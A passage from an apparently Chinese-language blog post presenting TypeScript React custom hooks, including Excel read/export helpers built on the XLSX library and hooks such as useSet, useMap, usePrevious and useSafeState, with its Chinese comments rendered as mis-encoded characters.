          <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
          columns.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">col: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> columnIndex = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_col</span>(col) <span class="hljs-comment">// å°†åˆ—å­—æ¯è½¬æ¢ä¸ºç´¢å¼•</span>
            <span class="hljs-keyword">const</span> cellAddress = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">encode_cell</span>({
              <span class="hljs-attr">r</span>: row,
              <span class="hljs-attr">c</span>: columnIndex,
            }) <span class="hljs-comment">// Aåˆ—æ˜¯ç¬¬0åˆ—</span>
            <span class="hljs-keyword">const</span> cell = worksheet[cellAddress]
            <span class="hljs-keyword">const</span> field = fieldsMap[col] ?? col
            res[field] = cell ? cell.<span class="hljs-property">v</span> : <span class="hljs-string">''</span>
          })
          columnData.<span class="hljs-title function_">push</span>(res)
        }

        <span class="hljs-title function_">resolve</span>(columnData)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»å·¥ä½œè¡¨ä¸­è·å–æŒ‡å®šåˆ—çš„æ•°æ®
   *
   * æ­¤å‡½æ•°ä»Excelå·¥ä½œè¡¨ä¸­è·å–æŒ‡å®šåˆ—çš„æ‰€æœ‰æ•°æ®ï¼ˆè·³è¿‡æ ‡é¢˜è¡Œï¼‰
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.WorkSheet</span>} <span class="hljs-variable">worksheet</span> - Excelå·¥ä½œè¡¨å¯¹è±¡
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">column</span> - è¦è·å–æ•°æ®çš„åˆ—ï¼ˆå¦‚'A'ã€'B'ï¼‰
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any[]</span>} è¿”å›æŒ‡å®šåˆ—çš„æ•°æ®æ•°ç»„
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">getColumnData</span>(<span class="hljs-params">worksheet: XLSX.WorkSheet, column: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> columnData = []
    <span class="hljs-keyword">const</span> range = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_range</span>(worksheet[<span class="hljs-string">'!ref'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>)
    <span class="hljs-keyword">const</span> columnIndex = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_col</span>(column) <span class="hljs-comment">// å°†åˆ—å­—æ¯è½¬æ¢ä¸ºç´¢å¼•</span>

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> row = range.<span class="hljs-property">s</span>.<span class="hljs-property">r</span> + <span class="hljs-number">1</span>; row &lt;= range.<span class="hljs-property">e</span>.<span class="hljs-property">r</span>; row++) {
      <span class="hljs-keyword">const</span> cellAddress = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">encode_cell</span>({ <span class="hljs-attr">r</span>: row, <span class="hljs-attr">c</span>: columnIndex })
      <span class="hljs-keyword">const</span> cell = worksheet[cellAddress]
      columnData.<span class="hljs-title function_">push</span>(cell ? cell.<span class="hljs-property">v</span> : <span class="hljs-literal">null</span>)
    }

    <span class="hljs-keyword">return</span> columnData
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»æœ¬åœ°æ–‡ä»¶è¯»å–Excelå·¥ä½œç°¿
   *
   * æ­¤å‡½æ•°ä»Fileæˆ–Blobå¯¹è±¡è¯»å–Excelæ–‡ä»¶å¹¶è¿”å›å·¥ä½œç°¿å¯¹è±¡
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - è¦è¯»å–çš„Excelæ–‡ä»¶
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.ParsingOptions</span>} [options] - è§£æé€‰é¡¹
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;WorkBook | false&gt;</span>} è¿”å›å·¥ä½œç°¿å¯¹è±¡æˆ–falseï¼ˆè¯»å–å¤±è´¥æ—¶ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromFile</span>(<span class="hljs-params">
    file: File | Blob,
    options: XLSX.ParsingOptions = {
      <span class="hljs-keyword">type</span>: <span class="hljs-string">'binary'</span>,
      raw: <span class="hljs-literal">true</span>,
      cellNF: <span class="hljs-literal">true</span>,
    },
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, options)
        <span class="hljs-title function_">resolve</span>(workbook)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»URLè¯»å–Excelå·¥ä½œç°¿
   *
   * æ­¤å‡½æ•°ä»URLè¯»å–Excelæ–‡ä»¶å¹¶è¿”å›å·¥ä½œç°¿å¯¹è±¡
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - Excelæ–‡ä»¶çš„URLåœ°å€
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.ParsingOptions</span>} [options] - è§£æé€‰é¡¹
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">WorkBook</span>} è¿”å›å·¥ä½œç°¿å¯¹è±¡
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromUrl</span>(<span class="hljs-params">
    url: <span class="hljs-built_in">string</span>,
    options: XLSX.ParsingOptions = {
      <span class="hljs-keyword">type</span>: <span class="hljs-string">'string'</span>,
      raw: <span class="hljs-literal">true</span>,
      cellNF: <span class="hljs-literal">true</span>,
    },
  </span>): <span class="hljs-title class_">WorkBook</span> {
    <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">readFile</span>(url, options)
    <span class="hljs-keyword">return</span> workbook
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»URLè¯»å–Excelå·¥ä½œç°¿
   *
   * æ­¤å‡½æ•°ä»URLè¯»å–Excelæ–‡ä»¶å¹¶è¿”å›å·¥ä½œç°¿å¯¹è±¡
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - Excelæ–‡ä»¶çš„URLåœ°å€
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.ParsingOptions</span>} [options] - è§£æé€‰é¡¹
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">WorkBook</span>} è¿”å›å·¥ä½œç°¿å¯¹è±¡
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromUrl1</span>(<span class="hljs-params">url: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url)
      <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">blob</span>()
      <span class="hljs-keyword">const</span> wb = <span class="hljs-title function_">readWorkbookFromFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([blob]))
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(wb)
    } <span class="hljs-keyword">catch</span>  {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
    }
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä¿å­˜å·¥ä½œç°¿ä¸ºExcelæ–‡ä»¶
   *
   * æ­¤å‡½æ•°å°†å·¥ä½œç°¿å¯¹è±¡ä¿å­˜ä¸ºExcelæ–‡ä»¶
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">WorkBook</span>} <span class="hljs-variable">workbook</span> - è¦ä¿å­˜çš„å·¥ä½œç°¿å¯¹è±¡
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">fileName</span> - æ–‡ä»¶å
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.WritingOptions</span>} [options] - å†™å…¥é€‰é¡¹
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">saveWbToExcel</span>(<span class="hljs-params">
    workbook: WorkBook,
    fileName: <span class="hljs-built_in">string</span>,
    options?: XLSX.WritingOptions,
  </span>) {
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(workbook, fileName, options)
  }

  <span class="hljs-keyword">return</span> {
    exportJson2Excel,
    exportAoa2Excel,
    exportBuffer2Excel,
    exportJson2ExcelSheets,
    exportUrl2Excel,
    readWorkbookFromLocalFile,
    readFileToJson,
    readFileToJsons,
    readColumnFromSheet,
    getColumnData,
    readWorkbookFromFile,
    readWorkbookFromUrl,
    readWorkbookFromUrl1,
    saveWbToExcel,
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useExcel

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> {
    exportJson2Excel,
    readFileToJson,
    readFileToJsons,
    readColumnFromSheet,
    readWorkbookFromUrl,
    readWorkbookFromUrl1,
    readWorkbookFromFile,
    saveWbToExcel,
  } = <span class="hljs-title function_">useExcel</span>()
</code></pre>
<h3 data-id="heading-3">useSet</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useMemo, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// å®šä¹‰æ“ä½œæ–¹æ³•çš„æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Actions</span>&lt;T&gt; {
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// æ–°å¢ä¸€æ¡æ•°æ®</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">map: <span class="hljs-built_in">Set</span>&lt;T&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®å…¨éƒ¨æ•°æ®</span>
  <span class="hljs-attr">remove</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// åˆ é™¤æŸæ¡æ•°æ®</span>
  <span class="hljs-attr">clear</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// æ¸…ç©ºæ•°æ®</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// é‡ç½®ä¸ºé»˜è®¤å€¼</span>
}

<span class="hljs-keyword">function</span> useSet&lt;T&gt;(<span class="hljs-attr">defaultValue</span>: <span class="hljs-title class_">Set</span>&lt;T&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()): [<span class="hljs-title class_">Set</span>&lt;T&gt;, <span class="hljs-title class_">Actions</span>&lt;T&gt;] {
  <span class="hljs-keyword">const</span> [sets, setSets] = useState&lt;<span class="hljs-title class_">Set</span>&lt;T&gt;&gt;(defaultValue)

  <span class="hljs-comment">// ç¼“å­˜æ“ä½œæ–¹æ³•é¿å…é‡å¤åˆ›å»º</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ–°å¢æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">value: T</span>) =&gt; {
      <span class="hljs-keyword">const</span> newSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(sets)
      newSet.<span class="hljs-title function_">add</span>(value)
      <span class="hljs-title function_">setSets</span>(newSet)
    }

    <span class="hljs-comment">// è®¾ç½®å…¨éƒ¨æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">sets: <span class="hljs-built_in">Set</span>&lt;T&gt;</span>) =&gt; {
      <span class="hljs-title function_">setSets</span>(sets)
    }

    <span class="hljs-comment">// åˆ é™¤æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">remove</span> = (<span class="hljs-params">key: T</span>) =&gt; {
      <span class="hljs-keyword">const</span> newSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(sets)
      newSet.<span class="hljs-title function_">delete</span>(key)
      <span class="hljs-title function_">setSets</span>(newSet)
    }

    <span class="hljs-comment">// æ¸…ç©ºæ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clear</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">const</span> newSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;T&gt;()
      <span class="hljs-title function_">setSets</span>(newSet)
    }

    <span class="hljs-comment">// é‡ç½®ä¸ºé»˜è®¤å€¼</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-title function_">setSets</span>(defaultValue)
    }

    <span class="hljs-keyword">return</span> { add, set, remove, clear, reset }
  }, [defaultValue, sets])

  <span class="hljs-keyword">return</span> [sets, actions] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useSet
</code></pre>
<h3 data-id="heading-4">useMap</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useMemo, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// å®šä¹‰æ“ä½œæ–¹æ³•çš„æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Actions</span>&lt;T, U&gt; {
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">key: T, value: U</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// æ–°å¢ä¸€æ¡æ•°æ®</span>
  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> U | <span class="hljs-literal">undefined</span> <span class="hljs-comment">// è·å–ä¸€æ¡æ•°æ®</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">map: <span class="hljs-built_in">Map</span>&lt;T, U&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// è®¾ç½®å…¨éƒ¨æ•°æ®</span>
  <span class="hljs-attr">remove</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// åˆ é™¤æŸæ¡æ•°æ®</span>
  <span class="hljs-attr">clear</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// æ¸…ç©ºæ•°æ®</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// é‡ç½®ä¸ºé»˜è®¤å€¼</span>
}

<span class="hljs-keyword">function</span> useMap&lt;T, U&gt;(
  <span class="hljs-attr">defaultValue</span>: <span class="hljs-title class_">Map</span>&lt;T, U&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),
): [<span class="hljs-title class_">Map</span>&lt;T, U&gt;, <span class="hljs-title class_">Actions</span>&lt;T, U&gt;] {
  <span class="hljs-keyword">const</span> [map, setMap] = useState&lt;<span class="hljs-title class_">Map</span>&lt;T, U&gt;&gt;(defaultValue)

  <span class="hljs-comment">// ç¼“å­˜æ“ä½œæ–¹æ³•é¿å…é‡å¤åˆ›å»º</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ–°å¢æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">key: T, value: U</span>) =&gt; {
      <span class="hljs-keyword">const</span> newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(map)
      newMap.<span class="hljs-title function_">set</span>(key, value)
      <span class="hljs-title function_">setMap</span>(newMap)
    }

    <span class="hljs-comment">// è·å–æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">get</span> = (<span class="hljs-params">key: T</span>) =&gt; {
      <span class="hljs-keyword">return</span> map.<span class="hljs-title function_">get</span>(key)
    }

    <span class="hljs-comment">// è®¾ç½®å…¨éƒ¨æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">map: <span class="hljs-built_in">Map</span>&lt;T, U&gt;</span>) =&gt; {
      <span class="hljs-title function_">setMap</span>(map)
    }

    <span class="hljs-comment">// åˆ é™¤æ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">remove</span> = (<span class="hljs-params">key: T</span>) =&gt; {
      <span class="hljs-keyword">const</span> newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(map)
      newMap.<span class="hljs-title function_">delete</span>(key)
      <span class="hljs-title function_">setMap</span>(newMap)
    }

    <span class="hljs-comment">// æ¸…ç©ºæ•°æ®</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clear</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">const</span> newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(map)
      newMap.<span class="hljs-title function_">clear</span>()
      <span class="hljs-title function_">setMap</span>(newMap)
    }

    <span class="hljs-comment">// é‡ç½®ä¸ºé»˜è®¤å€¼</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-title function_">setMap</span>(defaultValue)
    }

    <span class="hljs-keyword">return</span> { add, get, set, remove, clear, reset }
  }, [defaultValue, map])

  <span class="hljs-keyword">return</span> [map, actions] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useMap
</code></pre>
<h3 data-id="heading-5">usePrevious</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">ShouldUpdateFn</span>&lt;T&gt; = <span class="hljs-function">(<span class="hljs-params">prev: T | <span class="hljs-literal">undefined</span>, next: T</span>) =&gt;</span> <span class="hljs-built_in">boolean</span>
<span class="hljs-keyword">const</span> shouldUpdate = &lt;T&gt;<span class="hljs-function">(<span class="hljs-params">prev: T | <span class="hljs-literal">undefined</span>, next: T</span>) =&gt;</span> !<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(prev, next)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> usePrevious&lt;T&gt;(
  <span class="hljs-attr">state</span>: T,
  <span class="hljs-attr">shouldUp</span>: <span class="hljs-title class_">ShouldUpdateFn</span>&lt;T&gt; = shouldUpdate,
): T | <span class="hljs-literal">undefined</span> {
  <span class="hljs-keyword">const</span> curRef = useRef&lt;T&gt;() <span class="hljs-comment">// å½“å‰å€¼</span>
  <span class="hljs-keyword">const</span> preRef = useRef&lt;T&gt;() <span class="hljs-comment">// ä¸Šä¸€ä¸ªå€¼</span>

  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">shouldUp</span>(curRef.<span class="hljs-property">current</span>, state)) {
    preRef.<span class="hljs-property">current</span> = curRef.<span class="hljs-property">current</span>
    curRef.<span class="hljs-property">current</span> = state
  }

  <span class="hljs-keyword">return</span> preRef.<span class="hljs-property">current</span>
}
</code></pre>
<h3 data-id="heading-6">useLatest</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">RefObject</span>, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// è·å–æŸä¸ªstateçš„æœ€æ–°å€¼çš„hook</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useLatest&lt;S&gt;(<span class="hljs-attr">value</span>: S): <span class="hljs-title class_">RefObject</span>&lt;S&gt; {
  <span class="hljs-comment">// useRef ä¿å­˜èƒ½ä¿è¯æ¯æ¬¡è·å–åˆ°çš„éƒ½æ˜¯æœ€æ–°çš„å€¼</span>
  <span class="hljs-keyword">const</span> curRef = useRef&lt;S&gt;(value)
  curRef.<span class="hljs-property">current</span> = value

  <span class="hljs-keyword">return</span> curRef
}
</code></pre>
<h3 data-id="heading-7">useSafeState</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useUnmount } <span class="hljs-keyword">from</span> <span class="hljs-string">'ahooks'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dispatch</span>, <span class="hljs-title class_">SetStateAction</span>, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// ä¸»è¦æ˜¯å®ç° setRafState æ–¹æ³•ï¼Œåœ¨å¤–éƒ¨è°ƒç”¨ setRafState æ–¹æ³•æ—¶ï¼Œä¼šå–æ¶ˆä¸Šä¸€æ¬¡çš„ setState å›è°ƒå‡½æ•°ï¼Œå¹¶æ‰§è¡Œ requestAnimationFrame æ¥æ§åˆ¶ setState çš„æ‰§è¡Œæ—¶æœº</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useSafeState&lt;S&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">SetStateAction</span>&lt;S&gt;&gt;] {
  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState)
  <span class="hljs-keyword">const</span> reqId = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setSafeState</span> = (<span class="hljs-params">state: SetStateAction&lt;S&gt;</span>) =&gt; {
    <span class="hljs-title function_">cancelAnimationFrame</span>(reqId.<span class="hljs-property">current</span>)

    reqId.<span class="hljs-property">current</span> = <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// åœ¨å›è°ƒæ‰§è¡ŒçœŸæ­£çš„ setState</span>
      <span class="hljs-title function_">setState</span>(state)
    })
  }

  <span class="hljs-title function_">useUnmount</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">cancelAnimationFrame</span>(reqId.<span class="hljs-property">current</span>)
  })

  <span class="hljs-keyword">return</span> [state, setSafeState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-8">useSetState</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getTypeOf } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SetStateAction</span>, useCallback, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// ç±»ä¼¼äºä»¥å‰çš„setStateï¼Œæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå›è°ƒå‡½æ•°çš„å‚æ•°æ˜¯æœ€æ–°çš„å€¼</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useSetState&lt;S&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-function">(<span class="hljs-params">state: SetStateAction&lt;S&gt;, cb?: (state: S) =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>] {
  <span class="hljs-keyword">const</span> [state, set] = <span class="hljs-title function_">useState</span>(initialState)
  <span class="hljs-keyword">const</span> curRef = useRef&lt;S&gt;(state)
  curRef.<span class="hljs-property">current</span> = state

  <span class="hljs-keyword">const</span> setState = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">state: SetStateAction&lt;S&gt;, cb?: (state: S) =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> {
      <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> newState =
          <span class="hljs-title function_">getTypeOf</span>(state) === <span class="hljs-string">'Function'</span>
            ? (state <span class="hljs-keyword">as</span> (<span class="hljs-attr">preState</span>: S) =&gt; S)(pre)
            : (state <span class="hljs-keyword">as</span> S)
        curRef.<span class="hljs-property">current</span> = newState
        <span class="hljs-keyword">return</span> newState
      })
      cb?.(curRef.<span class="hljs-property">current</span>)
    },
    [],
  )

  <span class="hljs-keyword">return</span> [state, setState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-9">useMergeStates</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getTypeOf } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dispatch</span>, <span class="hljs-title class_">SetStateAction</span>, useCallback, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// åˆå¹¶stateå±æ€§ï¼Œä½¿ç”¨çš„æ—¶å€™ä¸ç”¨æ•´ä½“é‡æ–°èµ‹å€¼</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useMergeStates&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">SetStateAction</span>&lt;<span class="hljs-title class_">Partial</span>&lt;S&gt;&gt;&gt;] {
  <span class="hljs-keyword">const</span> [state, set] = <span class="hljs-title function_">useState</span>(initialState)

  <span class="hljs-keyword">const</span> setState = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">patch: SetStateAction&lt;Partial&lt;S&gt;&gt;</span>) =&gt;</span> {
    <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> newState =
        <span class="hljs-title function_">getTypeOf</span>(patch) === <span class="hljs-string">'Function'</span>
          ? (patch <span class="hljs-keyword">as</span> (<span class="hljs-attr">preState</span>: <span class="hljs-title class_">Partial</span>&lt;S&gt;) =&gt; S)(pre)
          : (patch <span class="hljs-keyword">as</span> S)

      <span class="hljs-keyword">return</span> newState ? { ...pre, ...newState } : pre
    })
  }, [])

  <span class="hljs-keyword">return</span> [state, setState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-10">useGetState</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dispatch</span>, <span class="hljs-title class_">SetStateAction</span>, useCallback, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// åœ¨useStateçš„åŸºç¡€ä¸Šå¢åŠ è·å–æ–¹æ³•</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useGetState&lt;S&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
